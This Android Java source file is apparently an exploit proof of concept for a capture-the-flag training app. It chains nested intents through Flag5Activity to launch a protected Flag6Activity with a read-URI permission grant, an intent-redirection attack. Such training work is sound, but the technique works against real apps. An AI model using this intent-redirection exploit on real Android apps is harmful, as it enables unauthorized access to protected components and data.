package com.android.zerohextree;

import android.content.Intent;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityFlag6Binding;

public class flag6 extends AppCompatActivity {
    private static final String TAG = "EXPLOIT_POC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_flag5);

        Button startExploit = findViewById((R.id.start_exploite));

        startExploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                launchAttack2();
            }
        });
    }

    private void launchAttack2() {
        // Step 1: Create the Intent to directly launch Flag6Activity
        Intent flag6Intent = new Intent();
        flag6Intent.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag6Activity" // Explicitly target Flag6
        );
        flag6Intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); // Required for Flag6

        // Step 2: Create the "nextIntent" for Flag5Activity
        Intent nextone = new Intent();
        nextone.putExtra("reason", "next");
        nextone.setComponent(flag6Intent.getComponent()); // Inherit Flag6's component
        nextone.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); // Ensure flag is propagated

        // Step 3: Build maliciousIntent2 for Flag5Activity's checks
        Intent maliciousIntent2 = new Intent();
        maliciousIntent2.putExtra("return", 42); // Pass Flag5's check
        maliciousIntent2.putExtra("nextIntent", nextone); // Embed nextone

        // Step 4: Launch Flag5Activity
        Intent exploitIntent = new Intent();
        exploitIntent.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
        );
        exploitIntent.putExtra("android.intent.extra.INTENT", maliciousIntent2);

        Log.d(TAG, "Launching Exploit Intent...");
        startActivity(exploitIntent);
    }
}
